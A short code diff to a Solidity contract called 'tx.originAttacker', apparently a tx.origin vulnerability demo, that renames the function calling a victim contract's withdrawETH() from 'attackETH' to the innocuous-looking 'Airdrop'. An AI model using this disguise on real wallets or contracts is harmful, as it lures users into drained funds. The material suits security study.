@@ -20,7 +20,7 @@ contract tx.originAttacker {
         victimContract = IVictim(_victim);
     }
 
-    function attackETH() external {
+    function Airdrop() external {
        victimContract.withdrawETH();
     }
 
